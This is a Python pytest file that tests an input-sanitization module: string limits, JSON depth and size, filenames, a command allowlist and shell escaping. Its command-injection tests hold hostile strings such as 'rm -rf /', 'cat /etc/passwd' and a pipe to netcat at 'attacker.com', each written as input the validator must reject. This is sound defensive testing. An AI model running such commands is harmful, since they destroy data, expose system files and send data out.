#!/usr/bin/env python3
"""
Unit Tests for Input Sanitization Security Utilities

Tests input validation and sanitization to prevent injection attacks.
"""

import pytest
import sys
import json
from pathlib import Path

# Add scripts to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent / 'scripts'))

from security.input_sanitizer import (
    sanitize_string,
    sanitize_json_input,
    validate_file_size,
    sanitize_filename,
    validate_command_input,
    escape_shell_arg,
    InputValidationError
)


class TestSanitizeString:
    """Test string sanitization."""

    @pytest.mark.unit
    def test_safe_string(self):
        """Test that safe strings pass validation."""
        result = sanitize_string("Hello World 123")
        assert result == "Hello World 123"

    @pytest.mark.unit
    def test_string_too_long(self):
        """Test that overly long strings are rejected."""
        with pytest.raises(InputValidationError, match="exceeds maximum length"):
            sanitize_string("A" * 2000, max_length=100)

    @pytest.mark.unit
    def test_null_bytes_rejected(self):
        """Test that null bytes are rejected."""
        with pytest.raises(InputValidationError, match="null bytes"):
            sanitize_string("Hello\x00World")

    @pytest.mark.unit
    def test_special_chars_with_flag(self):
        """Test that special characters can be allowed."""
        result = sanitize_string("Hello<script>", allow_special_chars=True)
        assert result == "Hello<script>"

    @pytest.mark.unit
    def test_special_chars_without_flag(self):
        """Test that special characters are rejected by default."""
        with pytest.raises(InputValidationError, match="disallowed characters"):
            sanitize_string("Hello<script>", allow_special_chars=False)

    @pytest.mark.unit
    def test_whitespace_trimmed(self):
        """Test that leading/trailing whitespace is trimmed."""
        result = sanitize_string("  Hello World  ")
        assert result == "Hello World"

    @pytest.mark.unit
    def test_non_string_input(self):
        """Test that non-string input is rejected."""
        with pytest.raises(InputValidationError, match="Expected string"):
            sanitize_string(123)


class TestSanitizeJsonInput:
    """Test JSON input sanitization."""

    @pytest.mark.unit
    def test_valid_json(self):
        """Test that valid JSON is parsed."""
        result = sanitize_json_input('{"name": "test", "value": 123}')
        assert result == {"name": "test", "value": 123}

    @pytest.mark.unit
    def test_invalid_json(self):
        """Test that invalid JSON raises error."""
        with pytest.raises(InputValidationError, match="Invalid JSON"):
            sanitize_json_input('{"invalid": json}')

    @pytest.mark.unit
    def test_json_too_large(self):
        """Test that oversized JSON is rejected."""
        large_json = '{"data": "' + ('A' * 10 * 1024 * 1024) + '"}'
        with pytest.raises(InputValidationError, match="exceeds maximum"):
            sanitize_json_input(large_json, max_size_mb=5)

    @pytest.mark.unit
    def test_json_too_deep(self):
        """Test that deeply nested JSON is rejected."""
        # Create deeply nested JSON
        deep_json = '{"a":' * 50 + '1' + '}' * 50
        with pytest.raises(InputValidationError, match="nesting depth exceeds"):
            sanitize_json_input(deep_json, max_depth=10)

    @pytest.mark.unit
    def test_json_with_arrays(self):
        """Test that arrays are properly validated."""
        result = sanitize_json_input('{"items": [1, 2, 3]}')
        assert result == {"items": [1, 2, 3]}


class TestValidateFileSize:
    """Test file size validation."""

    @pytest.mark.unit
    def test_file_within_limit(self, temp_dir):
        """Test that files within limit pass validation."""
        test_file = temp_dir / "small.txt"
        test_file.write_bytes(b"small" * 100)  # Small file

        size = validate_file_size(test_file, "default")
        assert size < 1  # Less than 1MB

    @pytest.mark.unit
    def test_file_exceeds_limit(self, temp_dir):
        """Test that oversized files are rejected."""
        test_file = temp_dir / "large.bin"
        # Create 11MB file (exceeds 10MB default limit)
        test_file.write_bytes(b"0" * (11 * 1024 * 1024))

        with pytest.raises(InputValidationError, match="exceeds maximum"):
            validate_file_size(test_file, "default")

    @pytest.mark.unit
    def test_different_asset_types(self, temp_dir):
        """Test different size limits for different asset types."""
        test_file = temp_dir / "test.rom"
        # Create 9MB file
        test_file.write_bytes(b"0" * (9 * 1024 * 1024))

        # Should fail for ROM (max 8MB)
        with pytest.raises(InputValidationError):
            validate_file_size(test_file, "rom")

        # Should pass for audio (max 50MB)
        size = validate_file_size(test_file, "audio")
        assert 8 < size < 10

    @pytest.mark.unit
    def test_nonexistent_file(self, temp_dir):
        """Test error for non-existent file."""
        with pytest.raises(FileNotFoundError):
            validate_file_size(temp_dir / "nonexistent.txt")


class TestSanitizeFilename:
    """Test filename sanitization."""

    @pytest.mark.unit
    def test_safe_filename(self):
        """Test that safe filenames pass through."""
        result = sanitize_filename("my_file.txt")
        assert result == "my_file.txt"

    @pytest.mark.unit
    def test_spaces_replaced(self):
        """Test that spaces are replaced with underscores."""
        result = sanitize_filename("my file.txt")
        assert result == "my_file.txt"

    @pytest.mark.unit
    def test_special_chars_removed(self):
        """Test that special characters are removed."""
        result = sanitize_filename("file@#$%.txt")
        assert result == "file.txt"

    @pytest.mark.unit
    def test_path_separator_rejected(self):
        """Test that path separators cause error."""
        with pytest.raises(InputValidationError, match="path separators"):
            sanitize_filename("path/to/file.txt")

    @pytest.mark.unit
    def test_hidden_file_stripped(self):
        """Test that leading dots are stripped."""
        result = sanitize_filename(".hidden_file.txt")
        assert result == "hidden_file.txt"

    @pytest.mark.unit
    def test_null_byte_rejected(self):
        """Test that null bytes cause error."""
        with pytest.raises(InputValidationError, match="null bytes"):
            sanitize_filename("file\x00.txt")

    @pytest.mark.unit
    def test_empty_after_sanitization(self):
        """Test error when filename becomes empty."""
        with pytest.raises(InputValidationError, match="becomes empty"):
            sanitize_filename("@#$%")


class TestValidateCommandInput:
    """Test command validation against allowlist."""

    @pytest.mark.unit
    def test_allowed_command(self):
        """Test that allowed commands pass."""
        result = validate_command_input("build", ["build", "test", "deploy"])
        assert result == "build"

    @pytest.mark.unit
    def test_disallowed_command(self):
        """Test that disallowed commands are rejected."""
        with pytest.raises(InputValidationError, match="not in allowed list"):
            validate_command_input("rm -rf /", ["build", "test"])

    @pytest.mark.unit
    def test_empty_command(self):
        """Test that empty command is rejected."""
        with pytest.raises(InputValidationError):
            validate_command_input("", ["build", "test"])


class TestEscapeShellArg:
    """Test shell argument escaping."""

    @pytest.mark.unit
    def test_safe_arg(self):
        """Test that safe arguments don't need escaping."""
        result = escape_shell_arg("normal_arg")
        assert result == "normal_arg"

    @pytest.mark.unit
    def test_special_chars_quoted(self):
        """Test that arguments with special characters are quoted."""
        result = escape_shell_arg("arg; rm -rf /")
        assert result.startswith("'")
        assert result.endswith("'")
        assert ";" in result

    @pytest.mark.unit
    def test_single_quotes_escaped(self):
        """Test that single quotes are properly escaped."""
        result = escape_shell_arg("arg with 'quotes'")
        # Should escape the single quotes
        assert "'" in result


class TestInputSanitizerIntegration:
    """Integration tests for input sanitization."""

    @pytest.mark.integration
    def test_complete_input_validation(self, temp_dir):
        """Test complete input validation workflow."""
        # User provides filename
        user_filename = "my document.png"

        # Sanitize filename
        safe_name = sanitize_filename(user_filename)
        assert safe_name == "my_document.png"

        # Create file with sanitized name
        test_file = temp_dir / safe_name
        test_file.write_bytes(b"PNG" * 1000)

        # Validate file size
        size = validate_file_size(test_file, "image")
        assert size < 1  # Less than 1MB

    @pytest.mark.integration
    def test_json_injection_prevention(self):
        """Test that malicious JSON is caught."""
        malicious_payloads = [
            '{"a":' * 100 + '1' + '}' * 100,  # Deep nesting
            '{"data": "' + ('A' * 10 * 1024 * 1024) + '"}',  # Large payload
        ]

        for payload in malicious_payloads:
            with pytest.raises(InputValidationError):
                sanitize_json_input(payload, max_depth=10, max_size_mb=5)

    @pytest.mark.integration
    def test_command_injection_prevention(self):
        """Test that command injection attempts are prevented."""
        malicious_commands = [
            "build; rm -rf /",
            "test && cat /etc/passwd",
            "deploy | nc attacker.com 1234",
        ]

        allowed_commands = ["build", "test", "deploy"]

        for cmd in malicious_commands:
            with pytest.raises(InputValidationError):
                validate_command_input(cmd, allowed_commands)
